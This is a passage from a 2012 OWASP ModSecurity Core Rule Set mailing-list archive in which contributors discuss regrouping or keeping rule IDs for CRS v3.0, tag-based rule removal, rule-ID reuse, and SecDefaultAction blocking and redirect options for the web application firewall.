directory in which the accuracy/maturity values would be lower.


-Ryan


From: David Sinclair <dbsinclair at multiservice.com>
Date: Wed, 6 Jun 2012 10:28:01 -0500
To: Ryan Barnett <rbarnett at trustwave.com>,
"owasp-modsecurity-core-rule-set at lists.owasp.org"
<owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs



I think it is a good idea to better group the rules but it will require an
extensive review of rule exceptions.  If there is a mapping available from
the old id to the new id for those rules that are reassigned that would be
very helpful and reduce the review effort.

David B. Sinclair
Security Manager
Multi Service Corporation

+1-913-663-9474-w
+1-816-718-0449-m
dbsinclair at multiservice.com




From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf
Of Ryan Barnett
Sent: Wednesday, June 06, 2012 9:24 AM
To:owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs

One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved for
the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Referenc
e_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12] project

The rationale for this change is to make it easier to users to do exceptions
and disable groups ofrules by using SecRuleRemoveById, etc? That directive
has the capability to remove ranges of rule IDs, however over the years the
rule IDs were added ad-hoc and they are not properly grouped in this manner.
For instance, groupings could be something similar to this -

Protocol Violation ? 900000-900099
Protocol Policies - 900100?900199
Cross-site Scripting - 900200?900299
?
We would give each rule group approx 100 rule IDs.  The initial number would
be less than thatwhich would allow some growth.  After some analysis of the
current rules, we really shouldn't ever exceed those allotments as there
ends up being rule logic duplication and you just end up with bloated rule
amounts.

Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..

The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader




This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.
----------------------------------------------------------------------------
-----------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
----------------------------------------------------------------------------
-----------





This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.




From dbsinclair at multiservice.com  Wed Jun  6 15:28:01 2012
From: dbsinclair at multiservice.com (David Sinclair)
Date: Wed, 6 Jun 2012 10:28:01 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <CBF4E03D.504B3%rbarnett@trustwave.com>
References: <CBF4E03D.504B3%rbarnett@trustwave.com>
Message-ID: <3fbf20b54847484f88718b360d672fdb@mail.gmail.com>

I think it is a good idea to better group the rules but it will require an
extensive review of rule exceptions.  If there is a mapping available from
the old id to the new id for those rules that are reassigned that would be
very helpful and reduce the review effort.



*David B. Sinclair*

Security Manager

Multi Service Corporation



+1-913-663-9474-w

+1-816-718-0449-m

dbsinclair at multiservice.com


  ------------------------------

*From:* owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:
owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] *On Behalf Of *Ryan
Barnett
*Sent:* Wednesday, June 06, 2012 9:24 AM
*To:* owasp-modsecurity-core-rule-set at lists.owasp.org
*Subject:* [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs



One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved
for the OWASP CRS -

https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id



900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>
 project



The rationale for this change is to make it easier to users to do
exceptions and disable groups of rules by using SecRuleRemoveById, etc?
That directive has the capability to remove *ranges* of rule IDs, however
over the years the rule IDs were added ad-hoc and they are not properly
grouped in this manner.  For instance, groupings could be something similar
to this -



   - Protocol Violation ? 900000-900099
   - Protocol Policies - 900100?900199
   - Cross-site Scripting - 900200?900299
   - ?

 We would give each rule group approx 100 rule IDs.  The initial number
would be less than that which would allow some growth.  After some analysis
of the current rules, we really shouldn't ever exceed those allotments as
there ends up being rule logic duplication and you just end up with bloated
rule amounts.



Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..



The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.



Comments?



-- 

Ryan Barnett
Trustwave SpiderLabs

ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


 ------------------------------

This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.


---------------------------------------------------------------------------------------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
---------------------------------------------------------------------------------------

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/2421bd19/attachment-0002.html>

From RBarnett at trustwave.com  Wed Jun  6 15:40:21 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 10:40:21 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <3fbf20b54847484f88718b360d672fdb@mail.gmail.com>
Message-ID: <CBF4F0EC.504D3%rbarnett@trustwave.com>

I will investigate the idea of a rule mapping, but keep in mind that following -

 1.  One of our goals with the update is to make the rule accuracy better (less false positives).  So, just because a specific rule is currently a false positive and you chose to add an exception to disable it, that does not mean that you would need to keep the exception with the new version of the rule.
 2.  ModSecurity v2.7 (will be released very soon) has the new "accuracy" and "maturity" actions.  This will allow us (Trustwave) to give a relative score for each of these settings.  This will help you to decide which rules to run default or not.
 3.  As for directory structure groupings, it is my belief that all rules in the "base_rules" directory should have a very high quality of accuracy (low FP rate).  If a user wants to get more aggressive with detection, then they will be able to activate other rule files under the "experimental_rules" directory in which the accuracy/maturity values would be lower.

-Ryan

From: David Sinclair <dbsinclair at multiservice.com<mailto:dbsinclair at multiservice.com>>
Date: Wed, 6 Jun 2012 10:28:01 -0500
To: Ryan Barnett <rbarnett at trustwave.com<mailto:rbarnett at trustwave.com>>, "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]Updating Rule IDs

I think it is a good idea to better group the rules but it will require an extensive review of rule exceptions.  If there is a mapping available from the old id to the new id for those rules that are reassigned that would be very helpful and reduce the review effort.

David B. Sinclair
Security Manager
Multi Service Corporation

+1-913-663-9474-w
+1-816-718-0449-m
dbsinclair at multiservice.com<mailto:dbsinclair at multiservice.com>

________________________________
From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>] On Behalf Of Ryan Barnett
Sent: Wednesday, June 06, 2012 9:24 AM
To:owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]Updating Rule IDs

One of the items we are considering with the CRS v3.0 update is to start from scratch with all of the rule IDs.  We have a defined range reserved for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project> project

The rationale for this change is to make it easier to users to do exceptions and disable groups ofrules by using SecRuleRemoveById, etc? That directive has the capability to remove ranges of rule IDs, however over the years the rule IDs were added ad-hoc and they are not properly grouped in this manner.  For instance, groupings could be something similar to this -


 *   Protocol Violation ? 900000-900099
 *   Protocol Policies - 900100?900199
 *   Cross-site Scripting - 900200?900299
 *   ?
We would give each rule group approx 100 rule IDs.  The initial number would be less than thatwhich would allow some growth.  After some analysis of the current rules, we really shouldn't ever exceed those allotments as there ends up being rule logic duplication and you just end up with bloated rule amounts.

Keep in mind that the active rule IDs were going to change a bit anyways with this update as we will be consolidating many rules into highly optimized regexes, etc..

The only concern that I have with making this move would be if users have extensively implemented exceptions based on the current rule IDs.  They would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

---------------------------------------------------------------------------------------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
---------------------------------------------------------------------------------------



________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/ad2022b9/attachment-0003.html>

From RBarnett at trustwave.com  Wed Jun  6 20:16:39 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 15:16:39 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <NDBBLMJIGLJAFKPADIIJAEIGHNAA.mark@intcom.nl>
Message-ID: <CBF5319E.5057D%rbarnett@trustwave.com>

Mark,
Good points.  You are correct in that we can address this already with the
tag action: tag:'WEB_ATTACK/SQL_INJECTION'

This allows users to disable categories of rules with SecRuleRemoveByTag
directive.

Perhaps we should just keep existing rule IDs to help ease with updates.

I will reiterate though that we will be consolidating rules and many rule
IDs may just go away.  This brings up the issue of rule ID reuse.  Should
we ever re-use a rule ID?  If so, how should we notify the user.  I
believe that we can address that by utilizing the "rev" action.  If we
update a rule or re-use the rule ID for another purpose, we should then
increment the rev value.

Thoughts?

-Ryan



On 6/6/12 3:50 PM, "Mark Boos (IntCom)" <mark at intcom.nl> wrote:

>To me, it sounds like a database / categorization problem which you want
>to
>solve via id's. Is there no other way to add a category indication ? In my
>field, customers want to order member numbers to the alphabet. It's ok to
>do
>that when you start, but the next new member that comes gets max_id+1
>regardless of his last name.
>
>Also, it sounds like a lot of work to categorize every rule to new
>numbers,
>also in the future.
>
>And lastly, indeed; for the people who make exceptions based on the
>current
>rule id's, this will cause a lot lot of problems for them.
>
>Regards
>Mark
>
>-----Oorspronkelijk bericht-----
>Van: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org]Namens
>Ryan
>Barnett
>Verzonden: woensdag 6 juni 2012 17:40
>Aan: David Sinclair; owasp-modsecurity-core-rule-set at lists.owasp.org
>Onderwerp: Re: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>
>I will investigate the idea of a rule mapping, but keep in mind that
>following -
>One of our goals with the update is to make the rule accuracy better (less
>false positives).  So, just because a specific rule is currently a false
>positive and you chose to add an exception to disable it, that does not
>mean
>that you would need to keep the exception with the new version of the
>rule.
>ModSecurity v2.7 (will be released very soon) has the new "accuracy" and
>"maturity" actions.  This will allow us (Trustwave) to give a relative
>score
>for each of these settings.  This will help you to decide which rules to
>run
>default or not.
>As for directory structure groupings, it is my belief that all rules in
>the
>"base_rules" directory should have a very high quality of accuracy (low FP
>rate).  If a user wants to get more aggressive with detection, then they
>will be able to activate other rule files under the "experimental_rules"
>directory in which the accuracy/maturity values would be lower.
>
>
>-Ryan
>
>
>From: David Sinclair <dbsinclair at multiservice.com>
>Date: Wed, 6 Jun 2012 10:28:01 -0500
>To: Ryan Barnett <rbarnett at trustwave.com>,
>"owasp-modsecurity-core-rule-set at lists.owasp.org"
><owasp-modsecurity-core-rule-set at lists.owasp.org>
>Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>
>
>I think it is a good idea to better group the rules but it will require an
>extensive review of rule exceptions.  If there is a mapping available from
>the old id to the new id for those rules that are reassigned that would be
>very helpful and reduce the review effort.
>
>David B. Sinclair
>Security Manager
>Multi Service Corporation
>
>+1-913-663-9474-w
>+1-816-718-0449-m
>dbsinclair at multiservice.com
>
>
>
>
>From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf
>Of Ryan Barnett
>Sent: Wednesday, June 06, 2012 9:24 AM
>To:owasp-modsecurity-core-rule-set at lists.owasp.org
>Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>One of the items we are considering with the CRS v3.0 update is to start
>from scratch with all of the rule IDs.  We have a defined range reserved
>for
>the OWASP CRS -
>https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Refere
>nc
>e_Manual#id
>
>900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
>[12] project
>
>The rationale for this change is to make it easier to users to do
>exceptions
>and disable groups ofrules by using SecRuleRemoveById, etc? That directive
>has the capability to remove ranges of rule IDs, however over the years
>the
>rule IDs were added ad-hoc and they are not properly grouped in this
>manner.
>For instance, groupings could be something similar to this -
>
>Protocol Violation ? 900000-900099
>Protocol Policies - 900100?900199
>Cross-site Scripting - 900200?900299
>?
>We would give each rule group approx 100 rule IDs.  The initial number
>would
>be less than thatwhich would allow some growth.  After some analysis of
>the
>current rules, we really shouldn't ever exceed those allotments as there
>ends up being rule logic duplication and you just end up with bloated rule
>amounts.
>
>Keep in mind that the active rule IDs were going to change a bit anyways
>with this update as we will be consolidating many rules into highly
>optimized regexes, etc..
>
>The only concern that I have with making this move would be if users have
>extensively implemented exceptions based on the current rule IDs.  They
>would need to be aware of this when they migrate to v3.0.
>
>Comments?
>
>--
>Ryan Barnett
>Trustwave SpiderLabs
>ModSecurity Project Leader
>OWASP ModSecurity CRS Project Leader
>
>
>
>
>This transmission may contain information that is privileged,
>confidential,
>and/or exempt from disclosure under applicable law. If you are not the
>intended recipient, you are hereby notified that any disclosure, copying,
>distribution, or use of the information contained herein (including any
>reliance thereon) is STRICTLY PROHIBITED. If you received this
>transmission
>in error, please immediately contact the sender and destroy the material
>in
>its entirety, whether in electronic or hard copy format.
>--------------------------------------------------------------------------
>--
>-----------
>This email is intended solely for the use of the addressee and may
>contain information that is confidential, proprietary, or both.
>If you receive this email in error please immediately notify the
>sender and delete the email.
>--------------------------------------------------------------------------
>--
>-----------
>
>
>
>
>
>This transmission may contain information that is privileged,
>confidential,
>and/or exempt from disclosure under applicable law. If you are not the
>intended recipient, you are hereby notified that any disclosure, copying,
>distribution, or use of the information contained herein (including any
>reliance thereon) is STRICTLY PROHIBITED. If you received this
>transmission
>in error, please immediately contact the sender and destroy the material
>in
>its entirety, whether in electronic or hard copy format.
>
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.




From mark at intcom.nl  Wed Jun  6 20:40:39 2012
From: mark at intcom.nl (Mark Boos (IntCom))
Date: Wed, 6 Jun 2012 22:40:39 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
	Thread]Updating Rule IDs
In-Reply-To: <CBF5319E.5057D%rbarnett@trustwave.com>
Message-ID: <NDBBLMJIGLJAFKPADIIJKEIHHNAA.mark@intcom.nl>

> This brings up the issue of rule ID reuse.  Should
> we ever re-use a rule ID?
>From database point: don't re-use id's ; keep them unique.

An id should stay an id, nothing more nothing less; no categorizing or
re-using. What would be the benefit ?

I might be wrong, so i only speak from database perspective... Maybe there
are benefits of these ideas indeed that outweigh the disadvantages.

Regards
Mark




From RBarnett at trustwave.com  Wed Jun  6 20:16:39 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 15:16:39 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <NDBBLMJIGLJAFKPADIIJAEIGHNAA.mark@intcom.nl>
Message-ID: <CBF5319E.5057D%rbarnett@trustwave.com>

Mark,
Good points.  You are correct in that we can address this already with the
tag action: tag:'WEB_ATTACK/SQL_INJECTION'

This allows users to disable categories of rules with SecRuleRemoveByTag
directive.

Perhaps we should just keep existing rule IDs to help ease with updates.

I will reiterate though that we will be consolidating rules and many rule
IDs may just go away.  This brings up the issue of rule ID reuse.  Should
we ever re-use a rule ID?  If so, how should we notify the user.  I
believe that we can address that by utilizing the "rev" action.  If we
update a rule or re-use the rule ID for another purpose, we should then
increment the rev value.

Thoughts?

-Ryan



On 6/6/12 3:50 PM, "Mark Boos (IntCom)" <mark at intcom.nl> wrote:

>To me, it sounds like a database / categorization problem which you want
>to
>solve via id's. Is there no other way to add a category indication ? In my
>field, customers want to order member numbers to the alphabet. It's ok to
>do
>that when you start, but the next new member that comes gets max_id+1
>regardless of his last name.
>
>Also, it sounds like a lot of work to categorize every rule to new
>numbers,
>also in the future.
>
>And lastly, indeed; for the people who make exceptions based on the
>current
>rule id's, this will cause a lot lot of problems for them.
>
>Regards
>Mark
>
>-----Oorspronkelijk bericht-----
>Van: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org]Namens
>Ryan
>Barnett
>Verzonden: woensdag 6 juni 2012 17:40
>Aan: David Sinclair; owasp-modsecurity-core-rule-set at lists.owasp.org
>Onderwerp: Re: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>
>I will investigate the idea of a rule mapping, but keep in mind that
>following -
>One of our goals with the update is to make the rule accuracy better (less
>false positives).  So, just because a specific rule is currently a false
>positive and you chose to add an exception to disable it, that does not
>mean
>that you would need to keep the exception with the new version of the
>rule.
>ModSecurity v2.7 (will be released very soon) has the new "accuracy" and
>"maturity" actions.  This will allow us (Trustwave) to give a relative
>score
>for each of these settings.  This will help you to decide which rules to
>run
>default or not.
>As for directory structure groupings, it is my belief that all rules in
>the
>"base_rules" directory should have a very high quality of accuracy (low FP
>rate).  If a user wants to get more aggressive with detection, then they
>will be able to activate other rule files under the "experimental_rules"
>directory in which the accuracy/maturity values would be lower.
>
>
>-Ryan
>
>
>From: David Sinclair <dbsinclair at multiservice.com>
>Date: Wed, 6 Jun 2012 10:28:01 -0500
>To: Ryan Barnett <rbarnett at trustwave.com>,
>"owasp-modsecurity-core-rule-set at lists.owasp.org"
><owasp-modsecurity-core-rule-set at lists.owasp.org>
>Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>
>
>I think it is a good idea to better group the rules but it will require an
>extensive review of rule exceptions.  If there is a mapping available from
>the old id to the new id for those rules that are reassigned that would be
>very helpful and reduce the review effort.
>
>David B. Sinclair
>Security Manager
>Multi Service Corporation
>
>+1-913-663-9474-w
>+1-816-718-0449-m
>dbsinclair at multiservice.com
>
>
>
>
>From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf
>Of Ryan Barnett
>Sent: Wednesday, June 06, 2012 9:24 AM
>To:owasp-modsecurity-core-rule-set at lists.owasp.org
>Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
>Thread]Updating Rule IDs
>
>One of the items we are considering with the CRS v3.0 update is to start
>from scratch with all of the rule IDs.  We have a defined range reserved
>for
>the OWASP CRS -
>https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Refere
>nc
>e_Manual#id
>
>900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
>[12] project
>
>The rationale for this change is to make it easier to users to do
>exceptions
>and disable groups ofrules by using SecRuleRemoveById, etc? That directive
>has the capability to remove ranges of rule IDs, however over the years
>the
>rule IDs were added ad-hoc and they are not properly grouped in this
>manner.
>For instance, groupings could be something similar to this -
>
>Protocol Violation ? 900000-900099
>Protocol Policies - 900100?900199
>Cross-site Scripting - 900200?900299
>?
>We would give each rule group approx 100 rule IDs.  The initial number
>would
>be less than thatwhich would allow some growth.  After some analysis of
>the
>current rules, we really shouldn't ever exceed those allotments as there
>ends up being rule logic duplication and you just end up with bloated rule
>amounts.
>
>Keep in mind that the active rule IDs were going to change a bit anyways
>with this update as we will be consolidating many rules into highly
>optimized regexes, etc..
>
>The only concern that I have with making this move would be if users have
>extensively implemented exceptions based on the current rule IDs.  They
>would need to be aware of this when they migrate to v3.0.
>
>Comments?
>
>--
>Ryan Barnett
>Trustwave SpiderLabs
>ModSecurity Project Leader
>OWASP ModSecurity CRS Project Leader
>
>
>
>
>This transmission may contain information that is privileged,
>confidential,
>and/or exempt from disclosure under applicable law. If you are not the
>intended recipient, you are hereby notified that any disclosure, copying,
>distribution, or use of the information contained herein (including any
>reliance thereon) is STRICTLY PROHIBITED. If you received this
>transmission
>in error, please immediately contact the sender and destroy the material
>in
>its entirety, whether in electronic or hard copy format.
>--------------------------------------------------------------------------
>--
>-----------
>This email is intended solely for the use of the addressee and may
>contain information that is confidential, proprietary, or both.
>If you receive this email in error please immediately notify the
>sender and delete the email.
>--------------------------------------------------------------------------
>--
>-----------
>
>
>
>
>
>This transmission may contain information that is privileged,
>confidential,
>and/or exempt from disclosure under applicable law. If you are not the
>intended recipient, you are hereby notified that any disclosure, copying,
>distribution, or use of the information contained herein (including any
>reliance thereon) is STRICTLY PROHIBITED. If you received this
>transmission
>in error, please immediately contact the sender and destroy the material
>in
>its entirety, whether in electronic or hard copy format.
>
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org
>https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From RBarnett at trustwave.com  Wed Jun  6 17:03:39 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 12:03:39 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: SecDefaultAction
In-Reply-To: <CBF502DA.50503%rbarnett@trustwave.com>
Message-ID: <CBF50352.50508%rbarnett@trustwave.com>

Updated the following section for the SecDefaultAction directive that controls the mode of operation ? either self-contained or collaborative detection.

#
# -- [[ Modes of Operation: Self-Contained vs. Collaborative Detection ]] -----------------
#
# Each detection rule uses the "block" action which will inherit the SecDefaultAction
# specified below.  Your settings here will determine which mode of operation you use.
#
# -- [[ Self-Contained Mode ]] --
# Rules inherit the "deny" disruptive action.  The first rule that matches will block.
#
# -- [[ Collaborative Detection Mode ]] --
# This is a "delayed blocking" mode of operation where each matching rule will inherit
# the "pass" action and will only contribute to anomaly scores.  Transactional blocking
# can be applied
#
# -- [[ Alert Logging Control ]] --
# You have three options -
#
# - To log to both the Apache error_log and ModSecurity audit_log file use: "log"
# - To log *only* to the ModSecurity audit_log file use: "nolog,auditlog"
# - To log *only* to the Apache error_log file use: "log,noauditlog"
#
# Ref: http://blog.spiderlabs.com/2010/11/advanced-topic-of-the-week-traditional-vs-anomaly-scoring-detection-modes.html
# Ref: https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#SecDefaultAction
#
SecDefaultAction "phase:2,deny,log"

For discussion purposes, regarding "disruptive actions", I believe that we should consider responding differently to malicious transactions.  Issuing HTTP 4xx level response codes are of no help to non-malicious end users who have innocently triggered an alert and they also "tip the hand" a bit to malicious users that there is some type of separate security layer in place.  I am a proponent of trying to make a WAF deployment transparent to the user ? meaning that they can decipher when ModSecurity has triggered an alert vs. if the application itself issues some type of violation.

For example ? oftentimes when an invalid request is received, applications will issue 302 Redirects back to the previous page or a login page.  I would like to prose the idea of using the redirect action here within the SecDefaultAction setting and letting the ModSec Admin choose where to redirect users too when an alert is triggered.  Example:

SecDefaultAction "phase:2,redirect:http://www.example.com/login.php,log"

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/6b40b3c3/attachment-0003.html>

From mike.cramer at gmail.com  Wed Jun  6 15:30:14 2012
From: mike.cramer at gmail.com (Michael Cramer)
Date: Wed, 6 Jun 2012 11:30:14 -0400
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CBF4E03D.504B3%rbarnett@trustwave.com>
References: <CBF4E03D.504B3%rbarnett@trustwave.com>
Message-ID: <-7121284989596259125@unknownmsgid>

I like the idea of consolidating and making it easier to find rules. Is
there any way to map existing rule IDs to the new ones? It might allow the
change to happen without breaking so much stuff.

Sent from my iPhone

On Jun 6, 2012, at 11:24, Ryan Barnett <RBarnett at trustwave.com> wrote:

  One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved
for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

 900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>
 project

 The rationale for this change is to make it easier to users to do
exceptions and disable groups of rules by using SecRuleRemoveById, etc?
That directive has the capability to remove ranges of rule IDs, however
over the years the rule IDs were added ad-hoc and they are not properly
grouped in this manner.  For instance, groupings could be something similar
to this -


   - Protocol Violation ? 900000-900099
   - Protocol Policies - 900100?900199
   - Cross-site Scripting - 900200?900299
   - ?

We would give each rule group approx 100 rule IDs.  The initial number
would be less than that which would allow some growth.  After some analysis
of the current rules, we really shouldn't ever exceed those allotments as
there ends up being rule logic duplication and you just end up with bloated
rule amounts.

 Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..

 The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.

 Comments?

  --
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

------------------------------
This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.

_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/85b0d84b/attachment-0002.html>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/pkcs7-signature
Size: 4828 bytes
Desc: not available
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/85b0d84b/attachment-0002.bin>

